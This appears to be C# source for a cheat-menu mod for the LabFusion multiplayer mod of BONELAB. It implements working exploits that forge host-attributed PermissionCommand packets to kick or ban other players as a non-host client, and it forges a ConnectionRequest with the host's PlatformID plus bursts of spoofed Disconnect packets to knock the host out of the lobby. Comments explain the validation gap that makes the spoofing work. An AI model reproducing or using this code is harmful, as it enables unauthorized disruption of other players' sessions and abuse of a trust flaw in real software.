using System;
using System.Collections;
using System.Reflection;
using System.Text;
using BoneLib.BoneMenu;
using HarmonyLib;
using LabFusion;
using LabFusion.Data;
using LabFusion.Network;
using LabFusion.Network.Serialization;
using LabFusion.Player;
using LabFusion.Senders;
using LabFusion.UI.Popups;
using MelonLoader;
using UnityEngine;

namespace MonsterPanel
{
    /// <summary>
    /// Remote Action: lobby player list → Kick / Ban (forged host PermissionCommand on EOS).
    /// Kill Host: forge ConnectionRequest with host PlatformID → host SendConnectionDeny(self)
    /// (Disconnect + TimeoutDisconnect/KickMember). Direct Disconnect SendFromServer kept as backup.
    /// BoneMenu: maxElements=0 + deferred rebuild (Quest GUIPool-safe).
    /// </summary>
    internal static class RemoteAction
    {
        private const float ActionCooldownSec = 0.85f;
        private const byte HostSenderId = 0;

        private static Page _page;
        private static bool _hooked;
        private static bool _rebuildQueued;
        private static float _nextActionTime;

        // Cached EOSMessenger.SendPacket(ProductUserId, NetMessage, NetworkChannel, bool)
        private static MethodInfo _eosSendPacket;
        private static bool _eosSendLookupDone;

        public static void Install(Page root)
        {
            if (root == null) return;

            // maxElements=0 — pagination/index pages crash Quest GUIPool.
            _page = root.CreatePage("Remote Action", new Color(1f, 0.55f, 0.2f), 0, true);
            if (!_hooked)
            {
                Menu.OnPageOpened += (Action<Page>)OnPageOpened;
                _hooked = true;
            }
            Rebuild();

            // Sibling after Remote Action (main panel order: Kill Aura → Remote Action → Kill Host).
            root.CreateFunction("Kill Host", new Color(1f, 0.15f, 0.12f), (Action)KillHost);
        }

        private static void OnPageOpened(Page opened)
        {
            if (opened != _page) return;
            QueueRebuild();
        }

        private static void QueueRebuild()
        {
            if (_rebuildQueued) return;
            _rebuildQueued = true;
            MelonCoroutines.Start(DeferredRebuild());
        }

        private static IEnumerator DeferredRebuild()
        {
            yield return null;
            yield return null;
            _rebuildQueued = false;
            Rebuild();
        }

        private static void Rebuild()
        {
            if (_page == null) return;
            try
            {
                _page.RemoveAll();
                _page.CreateFunction("Refresh", new Color(0.7f, 0.7f, 0.7f), (Action)QueueRebuild);

                if (!HasServer())
                {
                    _page.CreateFunction("Not in a lobby", new Color(0.65f, 0.65f, 0.65f), (Action)(() => { }));
                    return;
                }

                int count = 0;
                foreach (PlayerID id in PlayerIDManager.PlayerIDs)
                {
                    if (id == null || !id.IsValid) continue;
                    bool isMe = false;
                    try { isMe = id.IsMe; } catch { /* */ }
                    if (isMe) continue;

                    byte sid = id.SmallID;
                    bool host = false;
                    try { host = id.IsHost; } catch { host = sid == HostSenderId; }

                    string label = SafeName(id) + (host ? " [HOST]" : "");
                    Color col = host ? new Color(1f, 0.85f, 0.25f) : new Color(0.95f, 0.9f, 0.85f);
                    Page sub = _page.CreatePage(label, col, 0, true);

                    byte sidKick = sid;
                    byte sidBan = sid;
                    if (host)
                    {
                        sub.CreateFunction("Host — use Kill Host", new Color(1f, 0.7f, 0.25f), (Action)(() => { }));
                    }
                    else
                    {
                        sub.CreateFunction("Kick", new Color(1f, 0.45f, 0.15f), (Action)(() => Kick(sidKick)));
                        sub.CreateFunction("Ban", new Color(1f, 0.2f, 0.2f), (Action)(() => Ban(sidBan)));
                    }
                    count++;
                }

                if (count == 0)
                    _page.CreateFunction("No other players", new Color(0.6f, 0.6f, 0.6f), (Action)(() => { }));
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Remote Action rebuild: " + e.Message);
            }
        }

        private static void Kick(byte targetSid)
        {
            if (!TryBeginAction()) return;
            try
            {
                if (!HasServer())
                {
                    Notify("Remote Action", "Not in a lobby.", error: true);
                    return;
                }

                PlayerID target = PlayerIDManager.GetPlayerID(targetSid);
                if (target == null || !target.IsValid)
                {
                    Notify("Remote Action", "Player left.", error: true);
                    QueueRebuild();
                    return;
                }
                if (target.IsMe)
                {
                    Notify("Remote Action", "Cannot kick yourself.", error: true);
                    return;
                }
                if (target.IsHost)
                {
                    Notify("Remote Action", "Cannot kick host — use Kill Host.", error: true);
                    return;
                }

                if (NetworkInfo.IsHost)
                {
                    NetworkHelper.KickUser(target);
                    MelonLogger.Msg($"Remote Action: Kick sid {targetSid} (host path).");
                    Notify("Remote Action", "Kicked " + SafeName(target) + ".");
                    QueueRebuild();
                    return;
                }

                if (!ForgePermission(PermissionCommandType.KICK, targetSid))
                {
                    Notify("Remote Action", "Kick failed.", error: true);
                    return;
                }

                MelonLogger.Msg($"Remote Action: Kick sid {targetSid} (forged host PermissionCommand).");
                Notify("Remote Action", "Kick sent: " + SafeName(target) + ".");
                QueueRebuild();
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Remote Action Kick: " + e.Message);
                Notify("Remote Action", "Kick error.", error: true);
            }
        }

        private static void Ban(byte targetSid)
        {
            if (!TryBeginAction()) return;
            try
            {
                if (!HasServer())
                {
                    Notify("Remote Action", "Not in a lobby.", error: true);
                    return;
                }

                PlayerID target = PlayerIDManager.GetPlayerID(targetSid);
                if (target == null || !target.IsValid)
                {
                    Notify("Remote Action", "Player left.", error: true);
                    QueueRebuild();
                    return;
                }
                if (target.IsMe)
                {
                    Notify("Remote Action", "Cannot ban yourself.", error: true);
                    return;
                }
                if (target.IsHost)
                {
                    Notify("Remote Action", "Cannot ban host — use Kill Host.", error: true);
                    return;
                }

                if (NetworkInfo.IsHost)
                {
                    NetworkHelper.BanUser(target);
                    MelonLogger.Msg($"Remote Action: Ban sid {targetSid} (host path).");
                    Notify("Remote Action", "Banned " + SafeName(target) + ".");
                    QueueRebuild();
                    return;
                }

                if (!ForgePermission(PermissionCommandType.BAN, targetSid))
                {
                    Notify("Remote Action", "Ban failed.", error: true);
                    return;
                }

                MelonLogger.Msg($"Remote Action: Ban sid {targetSid} (forged host PermissionCommand).");
                Notify("Remote Action", "Ban sent: " + SafeName(target) + ".");
                QueueRebuild();
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Remote Action Ban: " + e.Message);
                Notify("Remote Action", "Ban error.", error: true);
            }
        }

        private static void KillHost()
        {
            if (!TryBeginAction()) return;
            try
            {
                if (!HasServer())
                {
                    Notify("Kill Host", "Not in a lobby.", error: true);
                    return;
                }
                if (NetworkInfo.IsHost)
                {
                    Notify("Kill Host", "You are the host.", error: true);
                    return;
                }

                PlayerID host = PlayerIDManager.GetHostID();
                if (host == null || !host.IsValid || string.IsNullOrEmpty(host.PlatformID))
                {
                    Notify("Kill Host", "Host not found.", error: true);
                    return;
                }

                string hostPid = host.PlatformID;
                int ok = 0;

                // Primary: ConnectionRequest with BackupPlatformID = host.
                // Host sees "already in server" → SendConnectionDeny(host) →
                // Disconnect to self + TimeoutDisconnect/KickMember. Uses working ToServer path.
                if (ForgeHostSelfDeny(hostPid))
                    ok++;

                // Backup: direct ClientsOnly Disconnect via SendFromServer (+ raw EOS delayed).
                if (ForgeDisconnectBurst(hostPid, "Kicked from Server"))
                    ok++;

                if (ok <= 0)
                {
                    Notify("Kill Host", "Send failed.", error: true);
                    return;
                }

                MelonLogger.Msg($"Kill Host: sent ({ok} paths) pid={TrimId(hostPid)}");
                Notify("Kill Host", "Kill Host sent.");
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Kill Host: " + e.Message);
                Notify("Kill Host", "Error.", error: true);
            }
        }

        /// <summary>
        /// Craft PermissionCommandRequest with Sender=0 (host SmallID) and send ToServer.
        /// On EOS, ProcessPacket omits PlatformID → ValidateReceivedID skips → host treats as OWNER.
        /// </summary>
        private static bool ForgePermission(PermissionCommandType type, byte otherPlayer)
        {
            try
            {
                var data = new PermissionCommandRequestData
                {
                    Type = type,
                    OtherPlayer = otherPlayer
                };

                using NetWriter writer = NetWriter.Create();
                data.Serialize(writer);
                using NetMessage message = NetMessage.Create(
                    NativeMessageTag.PermissionCommandRequest,
                    writer,
                    CommonMessageRoutes.ReliableToServer,
                    HostSenderId);
                MessageSender.SendToServer(NetworkChannel.Reliable, message);
                return true;
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Remote Action forge PermissionCommand: " + e.Message);
                return false;
            }
        }

        /// <summary>
        /// Forge a join request claiming the host's PlatformID.
        /// Host ConnectionRequest handler hits "already in the server" and
        /// SendConnectionDeny(hostPlatformID) — same path host uses to deny joiners.
        /// </summary>
        private static bool ForgeHostSelfDeny(string hostPlatformId)
        {
            if (string.IsNullOrEmpty(hostPlatformId)) return false;
            try
            {
                string avatar = null;
                try { avatar = RigData.GetAvatarBarcode(); } catch { /* */ }
                if (string.IsNullOrEmpty(avatar))
                    avatar = "SLZ.BONELAB.Content.Avatar.AnimePlayerDefault";

                SerializedAvatarStats stats = null;
                try { stats = RigData.RigAvatarStats; } catch { /* */ }
                stats ??= new SerializedAvatarStats();

                ConnectionRequestData data;
                try
                {
                    data = ConnectionRequestData.Create(
                        hostPlatformId,
                        FusionMod.Version,
                        avatar,
                        stats);
                }
                catch
                {
                    // Create touches LocalPlayer metadata — fall back to a minimal payload.
                    data = new ConnectionRequestData
                    {
                        BackupPlatformID = hostPlatformId,
                        Version = FusionMod.Version,
                        AvatarBarcode = avatar,
                        AvatarStats = stats,
                        InitialMetadata = new System.Collections.Generic.Dictionary<string, string>(),
                        InitialEquippedItems = new System.Collections.Generic.List<string>(),
                    };
                }

                // Exact ConnectionSender.SendConnectionRequest shape (Broadcast → ToServer on client).
                using (NetWriter writer = NetWriter.Create())
                {
                    data.Serialize(writer);
                    using NetMessage message = NetMessage.Create(
                        NativeMessageTag.ConnectionRequest,
                        writer,
                        CommonMessageRoutes.None);
                    MessageSender.BroadcastMessage(NetworkChannel.Reliable, message);
                }

                // Second copy via SendToServer in case Broadcast path differs.
                using (NetWriter writer2 = NetWriter.Create())
                {
                    data.Serialize(writer2);
                    using NetMessage message2 = NetMessage.Create(
                        NativeMessageTag.ConnectionRequest,
                        writer2,
                        CommonMessageRoutes.None);
                    MessageSender.SendToServer(NetworkChannel.Reliable, message2);
                }

                MelonLogger.Msg("Kill Host: forged ConnectionRequest (host self-deny).");
                return true;
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Kill Host ConnectionRequest forge: " + e.Message);
                return false;
            }
        }

        /// <summary>
        /// Backup: Disconnect payload for host PlatformID, delivered client→host (channel 1).
        /// Also raw EOS send with AllowDelayedDelivery + MessageSender.SendFromServer burst.
        /// </summary>
        private static bool ForgeDisconnectBurst(string platformId, string reason)
        {
            if (string.IsNullOrEmpty(platformId)) return false;
            bool any = false;
            string reasonSafe = reason ?? string.Empty;

            for (int i = 0; i < 3; i++)
            {
                if (ForgeDisconnectOnce(platformId, reasonSafe))
                    any = true;
            }

            // Also poke every lobby peer with "host left" so clients drop host from list
            // if the host packet is the only one that fails (does not replace host leave).
            try
            {
                foreach (PlayerID id in PlayerIDManager.PlayerIDs)
                {
                    if (id == null || !id.IsValid || string.IsNullOrEmpty(id.PlatformID)) continue;
                    if (id.IsMe) continue;
                    ForgeDisconnectOnce(platformId, reasonSafe, deliverTo: id.PlatformID);
                }
            }
            catch { /* */ }

            return any;
        }

        private static bool ForgeDisconnectOnce(string payloadPlatformId, string reason, string deliverTo = null)
        {
            string target = deliverTo ?? payloadPlatformId;
            if (string.IsNullOrEmpty(target) || string.IsNullOrEmpty(payloadPlatformId))
                return false;

            try
            {
                // Exact ConnectionSender.SendConnectionDeny serialization.
                using (NetWriter writer = NetWriter.Create())
                {
                    DisconnectMessageData disconnect = DisconnectMessageData.Create(payloadPlatformId, reason);
                    writer.SerializeValue(ref disconnect);
                    using NetMessage message = NetMessage.Create(
                        NativeMessageTag.Disconnect,
                        writer,
                        CommonMessageRoutes.None);
                    MessageSender.SendFromServer(target, NetworkChannel.Reliable, message);
                    TryEosSendPacket(target, message, isServerHandled: false);
                }

                // Host SmallID overload when delivering to host.
                if (deliverTo == null)
                {
                    using NetWriter writer = NetWriter.Create();
                    DisconnectMessageData disconnect = DisconnectMessageData.Create(payloadPlatformId, reason);
                    writer.SerializeValue(ref disconnect);
                    using NetMessage message = NetMessage.Create(
                        NativeMessageTag.Disconnect,
                        writer,
                        CommonMessageRoutes.None);
                    MessageSender.SendFromServer(HostSenderId, NetworkChannel.Reliable, message);
                }

                return true;
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Kill Host Disconnect forge: " + e.Message);
                return false;
            }
        }

        private static void TryEosSendPacket(string platformId, NetMessage message, bool isServerHandled)
        {
            try
            {
                EnsureEosSendPacket();
                if (_eosSendPacket == null || message == null) return;

                Type puidType = AccessTools.TypeByName("Epic.OnlineServices.ProductUserId");
                if (puidType == null) return;

                MethodInfo fromString = AccessTools.Method(puidType, "FromString", new[] { typeof(string) });
                if (fromString == null) return;

                object userId = fromString.Invoke(null, new object[] { platformId });
                if (userId == null) return;

                // EOSMessenger.SendPacket(ProductUserId, NetMessage, NetworkChannel, bool)
                _eosSendPacket.Invoke(null, new object[] { userId, message, NetworkChannel.Reliable, isServerHandled });
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Kill Host EOS SendPacket: " + e.Message);
            }
        }

        private static void EnsureEosSendPacket()
        {
            if (_eosSendLookupDone) return;
            _eosSendLookupDone = true;
            try
            {
                Type messenger = AccessTools.TypeByName("LabFusion.Network.EpicGames.EOSMessenger");
                if (messenger == null)
                {
                    MelonLogger.Warning("Kill Host: EOSMessenger not found.");
                    return;
                }

                foreach (MethodInfo m in messenger.GetMethods(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.Public))
                {
                    if (m.Name != "SendPacket") continue;
                    ParameterInfo[] p = m.GetParameters();
                    if (p.Length == 4 && p[1].ParameterType == typeof(NetMessage) && p[3].ParameterType == typeof(bool))
                    {
                        _eosSendPacket = m;
                        break;
                    }
                }

                if (_eosSendPacket == null)
                    MelonLogger.Warning("Kill Host: EOSMessenger.SendPacket not found.");
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Kill Host EOS lookup: " + e.Message);
            }
        }

        private static bool TryBeginAction()
        {
            float now = Time.unscaledTime;
            if (now < _nextActionTime)
            {
                Notify("Remote Action", "Wait a moment.", error: true);
                return false;
            }
            _nextActionTime = now + ActionCooldownSec;
            return true;
        }

        private static bool HasServer()
        {
            try { return NetworkInfo.HasServer; }
            catch { return false; }
        }

        private static string TrimId(string id)
        {
            if (string.IsNullOrEmpty(id)) return "?";
            return id.Length <= 8 ? id : id.Substring(0, 8);
        }

        private static string SafeName(PlayerID id)
        {
            byte sid = 0;
            try { if (id != null) sid = id.SmallID; } catch { /* */ }

            string raw = null;
            try
            {
                if (id != null && id.TryGetDisplayName(out string display) && !string.IsNullOrWhiteSpace(display))
                    raw = display;
            }
            catch { /* */ }

            if (string.IsNullOrWhiteSpace(raw))
            {
                try { raw = id?.Metadata?.Username?.GetValueOrEmpty(); } catch { /* */ }
            }

            return AsciiMenuName(raw, sid);
        }

        private static string AsciiMenuName(string username, byte sid)
        {
            if (string.IsNullOrEmpty(username)) return "Player " + sid;
            var sb = new StringBuilder(username.Length);
            bool inTag = false;
            foreach (char c in username)
            {
                if (c == '<') { inTag = true; continue; }
                if (c == '>') { inTag = false; continue; }
                if (inTag) continue;
                if (c >= 32 && c < 127) sb.Append(c);
            }
            string s = sb.ToString().Trim();
            return s.Length == 0 ? ("Player " + sid) : s;
        }

        private static void Notify(string title, string message, bool error = false)
        {
            try
            {
                Notifier.Send(new Notification
                {
                    Title = title,
                    Message = message,
                    SaveToMenu = false,
                    ShowPopup = true,
                    PopupLength = error ? 3f : 2.2f,
                    Type = error ? NotificationType.ERROR : NotificationType.SUCCESS
                });
            }
            catch
            {
                MelonLogger.Msg(title + ": " + message);
            }
        }
    }
}
